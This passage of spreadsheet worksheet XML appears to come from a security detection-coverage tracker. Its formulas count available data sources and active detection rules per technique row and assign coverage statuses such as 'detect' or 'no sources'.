      </c>
      <c r="W592" t="b">
        <v>1</v>
      </c>
      <c r="X592" t="s">
        <v>2729</v>
      </c>
    </row>
    <row r="593" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A593" t="s">
        <v>2741</v>
      </c>
      <c r="B593" t="s">
        <v>2741</v>
      </c>
      <c r="C593" t="s">
        <v>125</v>
      </c>
      <c r="D593" t="s">
        <v>0</v>
      </c>
      <c r="E593" t="s">
        <v>549</v>
      </c>
      <c r="F593" s="9">
        <f t="shared" si="9"/>
        <v>1</v>
      </c>
      <c r="G593" s="9" cm="1">
        <f t="array" ref="G593">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H593" s="9" cm="1">
        <f t="array" ref="H593">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>0</v>
      </c>
      <c r="I593" s="9" t="str" cm="1">
        <f t="array" ref="I593">IF(SUM(IF($C593=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C593=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J593" s="9" t="str" cm="1">
        <f t="array" ref="J59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93" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M593" s="9" cm="1">
        <f t="array" ref="M593">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N593" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O593" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P593" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S59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93" t="s">
        <v>2513</v>
      </c>
      <c r="U593" t="s">
        <v>2742</v>
      </c>
      <c r="V593" t="s">
        <v>2743</v>
      </c>
      <c r="W593" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="594" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A594" t="s">
        <v>2744</v>
      </c>
      <c r="B594" t="s">
        <v>2744</v>
      </c>
      <c r="C594" t="s">
        <v>14</v>
      </c>
      <c r="D594" t="s">
        <v>0</v>
      </c>
      <c r="E594" t="s">
        <v>940</v>
      </c>
      <c r="F594" s="9">
        <f t="shared" si="9"/>
        <v>2</v>
      </c>
      <c r="G594" s="9" cm="1">
        <f t="array" ref="G594">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H594" s="9" cm="1">
        <f t="array" ref="H594">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>3</v>
      </c>
      <c r="I594" s="9" cm="1">
        <f t="array" ref="I594">IF(SUM(IF($C594=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C594=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v>1</v>
      </c>
      <c r="J594" s="9" cm="1">
        <f t="array" ref="J59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594" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>3</v>
      </c>
      <c r="M594" s="9" cm="1">
        <f t="array" ref="M594">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>3</v>
      </c>
      <c r="N594" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>1</v>
      </c>
      <c r="O594" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0.33333333333333331</v>
      </c>
      <c r="P594" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>detect</v>
      </c>
      <c r="S59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modifier should be increased for the technique</v>
      </c>
      <c r="T594" t="s">
        <v>2513</v>
      </c>
      <c r="U594" t="s">
        <v>2745</v>
      </c>
      <c r="V594" t="s">
        <v>2746</v>
      </c>
      <c r="W594" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="595" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A595" t="s">
        <v>2744</v>
      </c>
      <c r="B595" t="s">
        <v>2747</v>
      </c>
      <c r="C595" t="s">
        <v>251</v>
      </c>
      <c r="D595" t="s">
        <v>0</v>
      </c>
      <c r="E595" t="s">
        <v>940</v>
      </c>
      <c r="F595" s="9">
        <f t="shared" si="9"/>
        <v>2</v>
      </c>
      <c r="G595" s="9" cm="1">
        <f t="array" ref="G595">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H595" s="9" t="str" cm="1">
        <f t="array" ref="H595">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I595" s="9" t="str" cm="1">
        <f t="array" ref="I595">IF(SUM(IF($C595=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C595=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J595" s="9" t="str" cm="1">
        <f t="array" ref="J59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95" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M595" s="9" cm="1">
        <f t="array" ref="M595">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N595" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O595" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P595" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S59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95" t="s">
        <v>2513</v>
      </c>
      <c r="U595" t="s">
        <v>2748</v>
      </c>
      <c r="V595" t="s">
        <v>2749</v>
      </c>
      <c r="W595" t="b">
        <v>1</v>
      </c>
      <c r="X595" t="s">
        <v>2744</v>
      </c>
    </row>
    <row r="596" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A596" t="s">
        <v>2744</v>
      </c>
      <c r="B596" t="s">
        <v>2750</v>
      </c>
      <c r="C596" t="s">
        <v>2751</v>
      </c>
      <c r="D596" t="s">
        <v>0</v>
      </c>
      <c r="E596" t="s">
        <v>940</v>
      </c>
      <c r="F596" s="9">
        <f t="shared" si="9"/>
        <v>2</v>
      </c>
      <c r="G596" s="9" cm="1">
        <f t="array" ref="G596">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H596" s="9" t="str" cm="1">
        <f t="array" ref="H596">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I596" s="9" t="str" cm="1">
        <f t="array" ref="I596">IF(SUM(IF($C596=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C596=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J596" s="9" t="str" cm="1">
        <f t="array" ref="J59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96" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M596" s="9" cm="1">
        <f t="array" ref="M596">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N596" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O596" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P596" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S59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96" t="s">
        <v>2513</v>
      </c>
      <c r="U596" t="s">
        <v>2752</v>
      </c>
      <c r="V596" t="s">
        <v>2746</v>
      </c>
      <c r="W596" t="b">
        <v>1</v>
      </c>
      <c r="X596" t="s">
        <v>2744</v>
      </c>
    </row>
    <row r="597" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A597" t="s">
        <v>2744</v>
      </c>
      <c r="B597" t="s">
        <v>2753</v>
      </c>
      <c r="C597" t="s">
        <v>2754</v>
      </c>
      <c r="D597" t="s">
        <v>0</v>
      </c>
      <c r="E597" t="s">
        <v>367</v>
      </c>
      <c r="F597" s="9">
        <f t="shared" si="9"/>
        <v>1</v>
      </c>
      <c r="G597" s="9" cm="1">
        <f t="array" ref="G597">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H597" s="9" t="str" cm="1">
        <f t="array" ref="H597">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I597" s="9" t="str" cm="1">
        <f t="array" ref="I597">IF(SUM(IF($C597=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C597=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J597" s="9" t="str" cm="1">
        <f t="array" ref="J59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97" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M597" s="9" cm="1">
        <f t="array" ref="M597">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N597" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O597" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P597" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S59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97" t="s">
        <v>2513</v>
      </c>
      <c r="U597" t="s">
        <v>2755</v>
      </c>
      <c r="V597" t="s">
        <v>2756</v>
      </c>
      <c r="W597" t="b">
        <v>1</v>
      </c>
      <c r="X597" t="s">
        <v>2744</v>
      </c>
    </row>
    <row r="598" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A598" t="s">
        <v>2757</v>
      </c>
      <c r="B598" t="s">
        <v>2757</v>
      </c>
      <c r="C598" t="s">
        <v>102</v>
      </c>
      <c r="D598" t="s">
        <v>0</v>
      </c>
      <c r="F598" s="9">
        <f t="shared" si="9"/>
        <v>1</v>
      </c>
      <c r="G598" s="9" cm="1">
        <f t="array" ref="G598">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H598" s="9" cm="1">
        <f t="array" ref="H598">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>5</v>
      </c>
      <c r="I598" s="9" t="str" cm="1">
        <f t="array" ref="I598">IF(SUM(IF($C598=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C598=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J598" s="9" cm="1">
        <f t="array" ref="J59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598" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>5</v>
      </c>
      <c r="M598" s="9" cm="1">
        <f t="array" ref="M598">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>5</v>
      </c>
      <c r="N598" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O598" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P598" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S59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98" t="s">
        <v>2513</v>
      </c>
      <c r="U598" t="s">
        <v>2758</v>
      </c>
      <c r="V598" t="s">
        <v>2669</v>
      </c>
      <c r="W598" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="599" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A599" t="s">
        <v>2757</v>
      </c>
      <c r="B599" t="s">
        <v>2759</v>
      </c>
      <c r="C599" t="s">
        <v>2760</v>
      </c>
      <c r="D599" t="s">
        <v>0</v>
      </c>
      <c r="F599" s="9">
        <f t="shared" si="9"/>
        <v>1</v>
      </c>
      <c r="G599" s="9" cm="1">
        <f t="array" ref="G599">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H599" s="9" t="str" cm="1">
        <f t="array" ref="H599">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I599" s="9" t="str" cm="1">
        <f t="array" ref="I599">IF(SUM(IF($C599=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C599=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J599" s="9" t="str" cm="1">
        <f t="array" ref="J59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599" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M599" s="9" cm="1">
        <f t="array" ref="M599">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N599" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O599" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P599" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S59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599" t="s">
        <v>2513</v>
      </c>
      <c r="U599" t="s">
        <v>2761</v>
      </c>
      <c r="V599" t="s">
        <v>2669</v>
      </c>
      <c r="W599" t="b">
        <v>1</v>
      </c>
      <c r="X599" t="s">
        <v>2757</v>
      </c>
    </row>
    <row r="600" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A600" t="s">
        <v>2757</v>
      </c>
      <c r="B600" t="s">
        <v>2762</v>
      </c>
      <c r="C600" t="s">
        <v>2763</v>
      </c>
      <c r="D600" t="s">
        <v>0</v>
      </c>
      <c r="F600" s="9">
        <f t="shared" si="9"/>
        <v>1</v>
      </c>
      <c r="G600" s="9" cm="1">
        <f t="array" ref="G600">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H600" s="9" t="str" cm="1">
        <f t="array" ref="H600">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I600" s="9" t="str" cm="1">
        <f t="array" ref="I600">IF(SUM(IF($C600=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C600=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J600" s="9" t="str" cm="1">
        <f t="array" ref="J60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00" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M600" s="9" cm="1">
        <f t="array" ref="M600">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N600" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O600" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P600" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S60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00" t="s">
        <v>2513</v>
      </c>
      <c r="U600" t="s">
        <v>2764</v>
      </c>
      <c r="V600" t="s">
        <v>2669</v>
      </c>
      <c r="W600" t="b">
        <v>1</v>
      </c>
      <c r="X600" t="s">
        <v>2757</v>
      </c>
    </row>
    <row r="601" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A601" t="s">
        <v>2757</v>
      </c>
      <c r="B601" t="s">
        <v>2765</v>
      </c>
      <c r="C601" t="s">
        <v>2766</v>
      </c>
      <c r="D601" t="s">
        <v>0</v>
      </c>
      <c r="F601" s="9">
        <f t="shared" si="9"/>
        <v>1</v>
      </c>
      <c r="G601" s="9" cm="1">
        <f t="array" ref="G601">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H601" s="9" t="str" cm="1">
        <f t="array" ref="H601">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I601" s="9" t="str" cm="1">
        <f t="array" ref="I601">IF(SUM(IF($C601=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C601=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J601" s="9" t="str" cm="1">
        <f t="array" ref="J60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01" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M601" s="9" cm="1">
        <f t="array" ref="M601">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N601" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O601" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P601" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S60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01" t="s">
        <v>2513</v>
      </c>
      <c r="U601" t="s">
        <v>2767</v>
      </c>
      <c r="V601" t="s">
        <v>2669</v>
      </c>
      <c r="W601" t="b">
        <v>1</v>
      </c>
      <c r="X601" t="s">
        <v>2757</v>
      </c>
    </row>
    <row r="602" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A602" t="s">
        <v>2757</v>
      </c>
      <c r="B602" t="s">
        <v>2768</v>
      </c>
      <c r="C602" t="s">
        <v>2769</v>
      </c>
      <c r="D602" t="s">
        <v>0</v>
      </c>
      <c r="F602" s="9">
        <f t="shared" si="9"/>
        <v>1</v>
      </c>
      <c r="G602" s="9" cm="1">
        <f t="array" ref="G602">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H602" s="9" t="str" cm="1">
        <f t="array" ref="H602">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I602" s="9" t="str" cm="1">
        <f t="array" ref="I602">IF(SUM(IF($C602=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C602=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J602" s="9" t="str" cm="1">
        <f t="array" ref="J60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02" s="9">
